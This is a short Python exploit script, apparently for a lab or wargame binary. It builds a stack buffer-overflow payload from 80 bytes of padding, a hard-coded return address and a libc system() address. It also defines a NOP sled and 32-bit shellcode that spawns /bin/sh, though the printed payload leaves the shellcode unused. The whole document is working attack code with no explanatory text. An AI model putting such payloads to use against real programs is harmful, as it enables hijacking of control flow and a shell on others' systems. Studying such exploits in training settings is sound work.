import string
import struct

pad = ""
for i, c in enumerate(string.ascii_uppercase):
    pad += c * 4
    if (int(i) + 1) * 4 == 80:
        break


ret_to = struct.pack("I",0x080484f9)
cc = "\xCC"*4
nop = "\x90"*100
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
system = struct.pack("I",0xb7ecffb0)
ret_after_system = "A"*4

payload = pad + ret_to + system

print(payload)
